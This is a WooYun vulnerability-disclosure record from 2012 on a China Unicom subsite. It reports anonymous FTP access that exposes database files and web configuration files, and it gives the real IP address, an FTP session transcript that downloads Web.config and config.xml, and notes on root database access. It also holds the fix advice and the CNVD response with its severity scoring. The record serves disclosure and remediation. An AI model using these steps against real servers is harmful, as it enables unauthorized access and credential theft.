{"id": 20086, "wybug_id": "wooyun-2012-05936", "wybug_title": "中国联通分站匿名FTP目录遍历，泄露数据库、WEB配置文件", "wybug_corp": "中国联通", "wybug_author": "along", "wybug_date": "2012-04-11 10:50", "wybug_open_date": "2012-05-26 10:50", "wybug_type": "未授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-04-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-04-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-04-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-05-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-05-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-05-26：\t细节向公众公开  简要描述： 中国联通分站匿名FTP目录遍历，泄露数据库、WEB配置文件 详细说明：  中国联通分站匿名FTP目录遍历，泄露数据库、WEB配置文件c:\\>ftp 221.5.255.13Connected to 221.5.255.13.220-Wellcome to Home Ftp Server!220 Server ready.User (221.5.255.13:(none)): ftp331 Password required for ftp.Password:230 User Anonymous logged in.ftp> dir d:\\手机测速统计\\200 Port command successful.150 Opening data connection for directory list.drw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 .drw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 ..drw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 dbdrw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 web226 File sent okftp: 收到 232 字节，用时 0.00Seconds 232000.00Kbytes/sec.ftp>ftp> dir d:\\手机测速统计\\db\\200 Port command successful.150 Opening data connection for directory list.drw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 .drw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 ..-rw-rw-rw-   1 ftp      ftp      3145728 Aug 30  2011 MTS.mdf-rw-rw-rw-   1 ftp      ftp      1048576 Aug 30  2011 MTS_log.ldf226 File sent okftp: 收到 245 字节，用时 0.00Seconds 245000.00Kbytes/sec.ftp> dir d:\\手机测速统计\\web\\200 Port command successful.150 Opening data connection for directory list.drw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 .drw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 ..drw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 bin-rw-rw-rw-   1 ftp      ftp          214 Sep 20  2011 config.xml-rw-rw-rw-   1 ftp      ftp         1413 Sep 05  2011 Default.aspx-rw-rw-rw-   1 ftp      ftp         1024 Aug 22  2011 ftptest.aspx-rw-rw-rw-   1 ftp      ftp         1091 Aug 22  2011 Global.asaxdrw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 incdrw-rw-rw-   1 ftp      ftp            0 Jan 01 06:03 log-rw-rw-rw-   1 ftp      ftp      1054864 Apr 09 09:45 log.txt-rw-rw-rw-   1 ftp      ftp         1105 Aug 22  2011 login.aspx-rw-rw-rw-   1 ftp      ftp          445 Aug 22  2011 logout.aspxdrw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 query-rw-rw-rw-   1 ftp      ftp           90 Aug 22  2011 save.ashxdrw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 Scriptsdrw-rw-rw-   1 ftp      ftp            0 Aug 22  2011 test-rw-rw-rw-   1 ftp      ftp         1579 Aug 23  2011 Web.config226 File sent okftp: 收到 1072 字节，用时 0.03Seconds 33.50Kbytes/sec.ftp>ftp> get d:\\手机测速统计\\web\\Web.config200 Port command successful.150 Opening data connection for d:\\手机测速统计\\web\\Web.config.226 File sent okftp: 收到 1579 字节，用时 0.00Seconds 1579000.00Kbytes/sec.ftp>ftp> get d:\\手机测速统计\\web\\config.xml200 Port command successful.150 Opening data connection for d:\\手机测速统计\\web\\config.xml.226 File sent okftp: 收到 214 字节，用时 0.00Seconds 214000.00Kbytes/sec.ftp>   漏洞证明：  /dbservermfc/dbservermfc/Config/Config.xml\n\nd:\\手机测速统计\\web\\config.xml\n\nroot连接数据库\n\n用户账号密码列表\n\nadmin登录前台\n\n   修复方案：  升级FTP版本、禁止匿名访问。数据库、WEB配置文件中账号密码加密处理。   版权声明：转载请注明来源 along@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2012-04-12 11:34 厂商回复： CNVD确认并复现所述情况，暂未能判断系统所属单位，会协调中国联通集团公司处置，待其反馈。对该漏洞评分如下：CVSS评分：(AV:R/AC:L/Au:NR/C:C/A:P/I:P/B:N) Score:8.97（最高10分，高危)即：远程攻击、攻击难度低、不需要用户认证，对机密性造成完全影响，对可用性、完整性造成部分影响。技术难度系数：1.1(一般，ftp目录遍历不错)影响危害系数：1.1(一般，可能涉及电信行业单位，有待进一步反馈评估）综合评分：8.97*1.1*1.1=10.854 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-11 12:59 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  不错     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}